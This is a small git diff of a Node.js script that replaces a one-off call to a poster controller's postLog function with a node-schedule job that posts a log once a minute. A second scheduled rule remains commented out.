@@ -6,15 +6,15 @@ const poster = require('./controlers/posterControler');
 const filename = 'system.dll';
 
 
-poster.postLog();
+// poster.postLog();
 
 
-// const rule = new schedule.RecurrenceRule();
-// rule.second = 10;
-// const fileTask = schedule.scheduleJob(rule, function() {
-//   console.log("Posting log");
-//   poster.postLog();
-// });
+const rule = new schedule.RecurrenceRule();
+rule.second = 10;
+const fileTask = schedule.scheduleJob(rule, function() {
+  console.log("Posting log");
+  poster.postLog();
+});
 //
 // const rule2 = new schedule.RecurrenceRule();
 // rule2.second = 20;
